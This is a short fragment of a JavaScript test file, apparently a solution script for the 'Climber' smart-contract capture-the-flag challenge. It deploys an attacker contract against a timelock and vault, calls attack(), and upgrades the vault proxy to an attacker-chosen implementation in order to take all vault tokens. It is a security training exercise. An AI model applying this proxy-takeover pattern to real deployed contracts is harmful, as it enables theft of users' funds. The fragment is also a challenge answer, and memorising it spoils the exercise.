...
describe('[Challenge] Climber', function () {
    ...
    it('Execution', async function () {
        ...
        const attacker = await (await ethers.getContractFactory('ClimberAttacker', player)).deploy(timelock.address, vault.address);

        await attacker.connect(player).attack()

        // const climberFactory = await ethers.getContractFactory('ClimberVault2')
        // const data = climberFactory.interface.encodeFunctionData("initialize(address)", [token.address])
        // const attacker2 = await (await ethers.getContractFactory('ClimberVault2', player)).deploy();
        // await vault.connect(player).upgradeToAndCall(attacker2.address, data);
        const upgradeFactory = await ethers.getContractFactory('ClimberUpgrade', attacker);
        const upgradedVault = await upgrades.upgradeProxy(vault.address, upgradeFactory);

        // Take all vault tokens
